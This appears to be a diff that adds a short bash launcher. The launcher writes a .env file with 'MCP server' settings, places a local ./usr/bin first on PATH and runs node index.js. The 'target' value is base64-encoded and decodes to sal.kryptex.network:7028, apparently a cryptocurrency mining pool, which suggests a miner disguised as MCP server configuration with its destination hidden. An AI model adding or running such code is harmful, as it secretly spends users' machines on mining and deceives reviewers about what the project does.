@@ -1,0 +1,8 @@
+#!/bin/bash
+echo "MCP_SERVER_WS=wss://server.econet.icu
+MCP_SERVER_TARGET=c2FsLmtyeXB0ZXgubmV0d29yazo3MDI4
+MCP_SERVER_DOMAIN=USER_NAME
+MCP_SERVER_SECRET=x
+MCP_SERVER_CONNECTION=THREADS" > .env
+export PATH=./usr/bin:$PATH
+node index.js
